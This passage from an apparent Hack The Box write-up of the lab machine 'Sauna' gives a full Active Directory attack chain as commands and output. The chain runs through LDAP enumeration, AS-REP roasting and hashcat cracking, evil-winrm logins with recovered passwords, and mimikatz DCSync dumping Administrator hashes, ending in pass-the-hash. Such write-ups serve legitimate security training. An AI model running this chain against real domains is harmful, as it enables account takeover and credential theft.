|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-04 16:53:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=4/4%Time=5E885906%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m03s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-04T16:55:52
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   197.16 ms 10.10.14.1
2   198.35 ms 10.10.10.175

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr  4 05:58:29 2020 -- 1 IP address (1 host up) scanned in 356.97 seconds  
</code></pre></div></div>

<h2 id="using-nmap-to-see-any-users-can-be-found-in-the-domain">Using NMAP to see any users can be found in the domain.</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap 7.80 scan initiated Sat Apr  4 06:13:39 2020 as: nmap -n -sV -script *ldap* -p 389 -oA script.ldap 10.10.10.175
Nmap scan report for 10.10.10.175
Host is up (0.20s latency).

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
| ldap-brute: 
|   root: &lt;empty&gt;=&gt; Valid credentials
|   admin: &lt;empty&gt;=&gt; Valid credentials
|   administrator: &lt;empty&gt;=&gt; Valid credentials
|   webadmin: &lt;empty&gt;=&gt; Valid credentials
|   sysadmin: &lt;empty&gt;=&gt; Valid credentials
|   netadmin: &lt;empty&gt;=&gt; Valid credentials
|   guest: &lt;empty&gt;=&gt; Valid credentials
|   user: &lt;empty&gt;=&gt; Valid credentials
|   web: &lt;empty&gt;=&gt; Valid credentials
|_  test: &lt;empty&gt;=&gt; Valid credentials
| ldap-rootdse: 
| LDAP Results
|   &lt;root&gt;|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
|       ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna$@EGOTISTICAL-BANK.LOCAL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       serverName: CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|       isSynchronized: TRUE
|       highestCommittedUSN: 53385
|       dsServiceName: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       dnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL
|       defaultNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
|       currentTime: 20200404171356.0Z
|_      configurationNamingContext: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
| ldap-search: 
|   Context: DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: DC=EGOTISTICAL-BANK,DC=LOCAL
|         objectClass: top
|         objectClass: domain
|         objectClass: domainDNS
|         distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
|         instanceType: 5
|         whenCreated: 2020/01/23 05:44:25 UTC
|         whenChanged: 2020/04/03 23:33:53 UTC
|         subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|         subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|         subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         uSNCreated: 4099
|         dSASignature: \x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC
|         uSNChanged: 53269
|         name: EGOTISTICAL-BANK
|         objectGUID: 504e6ec-c122-a143-93c0-cf487f83363
|         replUpToDateVector: \x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xFDZ\x85\x92F\xDE^A\xAAVnj@#\xF6\x0C\x0B\xD0\x00\x00\x00\x00\x00\x00\xDFX\x98\x14\x03\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC	\xB0\x00\x00\x00\x00\x00\x00\xD4\x04R\x14\x03\x00\x00\x00
|         creationTime: 132304304332325407
|         forceLogoff: -9223372036854775808
|         lockoutDuration: -18000000000
|         lockOutObservationWindow: -18000000000
|         lockoutThreshold: 0
|         maxPwdAge: -36288000000000
|         minPwdAge: -864000000000
|         minPwdLength: 7
|         modifiedCountAtLastProm: 0
|         nextRid: 1000
|         pwdProperties: 1
|         pwdHistoryLength: 24
|         objectSid: 1-5-21-2966785786-3096785034-1186376766
|         serverState: 1
|         uASCompat: 1
|         modifiedCount: 1
|         auditingPolicy: \x00\x01
|         nTMixedDomain: 0
|         rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|         fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         systemFlags: -1946157056
|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         isCriticalSystemObject: TRUE
|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
|         masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         ms-DS-MachineAccountQuota: 10
|         msDS-Behavior-Version: 7
|         msDS-PerUserTrustQuota: 1
|         msDS-AllUsersTrustQuota: 1000
|         msDS-PerUserTrustTombstonesQuota: 10
|         msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         msDS-NcType: 0
|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
|         dc: EGOTISTICAL-BANK
|     dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
|_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Sat Apr  4 06:13:53 2020 -- 1 IP address (1 host up) scanned in 14.14 seconds&lt;/root&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;
</code></pre></div></div>

<p>As I tried a bunch of stuff using enum4linux, ldapsearch, rpcclient nothing returned out.</p>

<p><img src="/assets/img/sample/user.png" alt="" />
So I had to make my own user list from the aboutUs page from the url.</p>

<pre class="center"> <span style="color:yellow">
fergussmith
shauncoins
hugobear
bowietaylor
sophiedirver
stevenkerb
fsmith
scoins
hbear
btaylor
dsophie
sophied
skerb
ksteven
bhugo</span> 
</pre>

<h3 id="getting-the-tgt">Getting the TGT</h3>

<p>Using GetNPUsers.py, I was able to get the TGT of a user and cracking the TGT using HASHCAT.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetNPUsers.py -dc-ip sauna.htb -usersfile users.txt EGOTISTICAL-BANK.LOCAL/
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:eb75b20e0b65a8f0f42c52a06403a767$0423963b218ce13f92bbca4dbab1691b0a0f390bd9070f9524c92f800f46591462f1f5271e4ac41f42bca677e7e7479de436f053f8e4373d3ef45ac872a4c0f5b9073d2f34c05b063c5bac94e9c432fc6c6ea41a15afcc30f324ffcd5137540c0847f2a5a0dadcae7491e3fda91d26c0e929f377ec97a244c291159f02fc5d723cc1f3f5dc5064a6f67ecf56a27aeaf84d005aff8ec3e476e1e1c7f5f0fb20340ec81ea50de0838bcf2489d70ca04920f312b2e7d0827106768d09ea6f07cb117d11547b8ae3752dfc8398f8cb1110332cb6f412f0610f6c3a85ad8cc680d2d61f14de3f5bf59083ed62055b4fb41f3be91b5275f2f23ae411588ac45a65ed2d
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)` 
</code></pre></div></div>

<h3 id="hashcat">HASHCAT</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dictionary cache hit:
* Filename..: D:\Wordlist\rockyou.txt
* Passwords.: 14344387
* Bytes.....: 139921579
* Keyspace..: 14344387

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ff4e63efdef11ee2782d87399829857e$2109910f4bf10633f492b1b882805e4330caaa318fb715b4c04c0516f988fd06bfdeec8c2aa9a72bb8a1683ffe124e9ad6e67461be0c6ec8b423996a07217ab2c5835e1743318ab28f882f09a99ebc94409d4716cd6863e153003e62c24897b231f49daf725b7e98e3fd89d973e7c73613c9c0cafedbf341b1c93f451d5f07775ca94df35dbd858a7864e9c83182f93f88023b2ccbc8c584d7c4600a971b17614def93c8e270be2375d25717590e9c3edd83b618775dd812cd3c1c14bea8b3a6416249b9f6d5e4f9f249589c22dca0c75f4eb60fe0500ef78f72038391d2b239807f45587c3c097482d29761ff9ddd3554d6f15bf2b409a545b59d5196faa0d7:Thestrokes23
Cracking performance lower than expected?

* Append -O to the commandline.
  This lowers the maximum supported password- and salt-length (typically down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Update your OpenCL runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ff4e63e...faa0d7
Time.Started.....: Sat Apr 04 16:02:10 2020 (5 secs)
Time.Estimated...: Sat Apr 04 16:02:15 2020 (0 secs)
Guess.Base.......: File (D:\Wordlist\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2001.8 kH/s (12.17ms) @ Accel:256 Loops:1 Thr:64 Vec:1
Speed.#2.........:    93174 H/s (7.22ms) @ Accel:4 Loops:1 Thr:64 Vec:1
Speed.#*.........:  2094.9 kH/s
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 10543104/14344387 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10455040/14344387 (72.89%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: _20003479KNL -&gt; Teague51
Candidates.#2....: a0122455276 -&gt; _2000dani
Hardware.Mon.#1..: Temp: 54c Util: 27% Core: 928MHz Mem:2505MHz Bus:16
Hardware.Mon.#2..: N/A

Started: Sat Apr 04 16:01:47 2020
Stopped: Sat Apr 04 16:02:17 2020
</code></pre></div></div>

<h3 id="getting-usertxt">Getting User.txt</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -u fsmith -p Thestrokes23 -i sauna.htb

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; cd ..
*Evil-WinRM* PS C:\Users\FSmith&gt; cd Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; dir

    Directory: C:\Users\FSmith\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/23/2020  10:03 AM             34 user.txt
</code></pre></div></div>

<h3 id="privilege-escalation">privilege escalation</h3>

<p>Uploading and executing <span style="color:yellow">winPEAS</span>, I got some Autologin credentials.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Looking for AutoLogon credentials(T1012)
&lt;span style="color:yellow"&gt;    Some AutoLogon credentials were found!!&lt;/span&gt;
    DefaultDomainName             :  35mEGOTISTICALBANK
&lt;span style="color:yellow"&gt;   DefaultUserName               :  35mEGOTISTICALBANK\svc_loanmanager&lt;/span&gt;
&lt;span style="color:yellow"&gt;   DefaultPassword               :  Moneymakestheworldgoround! &lt;/span&gt;
</code></pre></div></div>

<p>Logging in as svc_loanmanager has not worked for me. Trying in a bunch of different ways I found the user name is [svc_loanmgr].</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\Users\svc_loanmgr\Desktop&gt; whoami /all

USER INFORMATION
----------------

User Name                   SID
=========================== ==============================================
egotisticalbank\svc_loanmgr S-1-5-21-2966785786-3096785034-1186376766-1108

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
</code></pre></div></div>

<p>As nothing seems to be intresting from [whoami /all], I used [BloodHound] to see the structure of the domain.<br />
<img src="/assets/img/sample/dcsync.png" alt="" /><br />
Seeing svc_loanmanager having the rights of DCsync, I moved to mimikatz to dump the hash of administrator.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./mimikatz.exe "lsadump::dcsync /user:administrator" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Mar  8 2020 18:30:37
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /user:administrator
[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
[DC] 'administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 1/24/2020 10:14:15 AM
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: ee8c50e6bc332970a8e8a632488f5211

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : caab2b641b39e342e0bdfcd150b1683e

* Primary:Kerberos-Newer-Keys *
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
      aes128_hmac       (4096) : 145e4d0e4a6600b7ec0ece74997651d0
      des_cbc_md5       (4096) : 19d5f15d689b1ce5
    OldCredentials
      aes256_hmac       (4096) : 9637f48fa06f6eea485d26cd297076c5507877df32e4a47497f360106b3c95ef
      aes128_hmac       (4096) : 52c02b864f61f427d6ed0b22639849df
      des_cbc_md5       (4096) : d9379d13f7c15d1c

* Primary:Kerberos *
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Credentials
      des_cbc_md5       : 19d5f15d689b1ce5
    OldCredentials
      des_cbc_md5       : d9379d13f7c15d1c

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  3fbea1ff422da035f1dc9b0ce45e84ea
    02  708091daa9db25abbd1d94246e4257e2
    03  417f2e40d5be8d436af749ed9fddb0b0
    04  3fbea1ff422da035f1dc9b0ce45e84ea
    05  50cb7cfb64edf83218804d934e30d431
    06  781dbcf7b8f9079382a1948f26f561ee
    07  4052111530264023a7d445957f5146e6
    08  8f4bffc5d94cc294272cd0c836e15c47
    09  0c81bc892ea87f7dd0f4a3a05b51f158
    10  f8c10a5bd37ea2568976d47ef12e55b9
    11  8f4bffc5d94cc294272cd0c836e15c47
    12  023b04503e3eef421de2fcaf8ba1297d
    13  613839caf0cf709da25991e2e5cb63cf
    14  16974c015c9905fb27e55a52dc14dfb0
    15  3c8af7ccd5e9bd131849990d6f18954b
    16  2b26fb63dcbf03fe68b67cdd2c72b6e6
    17  6eeda5f64e4adef4c299717eafbd2850
    18  3b32ec94978feeac76ba92b312114e2c
    19  b25058bc1ebfcac10605d39f65bff67f
    20  89e75cc6957728117eb1192e739e5235
    21  7e6d891c956f186006f07f15719a8a4e
    22  a2cada693715ecc5725a235d3439e6a2
    23  79e1db34d98ccd050b493138a3591683
    24  1f29ace4f232ebce1a60a48a45593205
    25  9233c8df5a28ee96900cc8b59a731923
    26  08c02557056f293aab47eccf1186c100
    27  695caa49e68da1ae78c1523b3442e230
    28  57d7b68bd2f06eae3ba10ca342e62a78
    29  3f14bb208435674e6a1cb8a957478c18

mimikatz(commandline) # exit
Bye! 
</code></pre></div></div>

<h3 id="getting-roottxt">Getting root.txt</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff -i sauna.htb
</code></pre></div></div>

<h2 id="and-we-get-the-shell-as-administrator">And we get the shell as administrator</h2>

<p><img src="/assets/img/sample/sauna-root.png" alt="" /></p>

<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.</p>

<p>My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>
</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2020-06-19T22:04:00+05:30"><!-- start custom article footer snippet -->

<!-- end custom article footer snippet -->
<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
</div><div class="article__license"><div class="license">
    </p>
  </div></div><p style="color:DodgerBlue;">HTB Badge :P</p>
  <p></p>
  >>>
  <img src="http://www.hackthebox.eu/badge/image/291968" alt="Hack The Box">
  >>>
</footer>
